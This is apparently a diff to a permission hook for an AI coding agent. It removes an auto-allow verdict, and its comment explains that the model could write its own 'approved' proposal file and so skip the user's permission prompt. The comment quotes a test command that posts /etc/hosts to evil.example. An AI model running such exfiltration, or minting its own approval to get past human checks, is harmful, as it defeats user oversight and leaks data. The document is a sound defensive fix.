@@ -633,13 +633,32 @@ try:
                 )
                 sys.exit(2)
 
-        print(json.dumps({"hookSpecificOutput": {
-            "hookEventName": "PreToolUse",
-            "permissionDecision": "allow",
-            "permissionDecisionReason":
-                "warrant: %s is approved and in progress; approval covers the work it described."
-                % proposal_path,
-        }}))
+        # Pass through — never `permissionDecision: "allow"`.
+        #
+        # This used to emit an allow verdict, which does not mean "warrant has
+        # no objection"; it means "skip the user's permission prompt". The
+        # authority for that grant was `status: approved` inside a file under
+        # docs/proposals/ — a file THE MODEL WRITES. Nothing gates its
+        # creation: with no approved proposal the gate stands down (see the
+        # `len(approved) != 1` branch), so the very Write that mints the
+        # authority is unguarded, and afterwards the proposal stays writable by
+        # design.
+        #
+        # Measured 2026-07-27 in a fresh repo:
+        #
+        #   curl -X POST --data-binary @/etc/hosts https://evil.example/x
+        #     with no proposal            -> exit 0, no verdict (normal prompt)
+        #     after the model writes one  -> permissionDecision: allow
+        #
+        # A hook cannot tell a human-approved proposal from a model-written
+        # one, so it must not convert repository-file state into a permission
+        # grant. Standing down (exit 0) leaves warrant's refusals intact — the
+        # out-of-scope and missing-trailer branches above still exit 2 — while
+        # letting the normal permission system decide what it was always
+        # supposed to decide.
+        sys.stderr.write(
+            "warrant: %s is approved and in progress; approval covers the work "
+            "it described.\n" % proposal_path)
         sys.exit(0)
 
     path = tool_input.get("file_path") or tool_input.get("notebook_path")
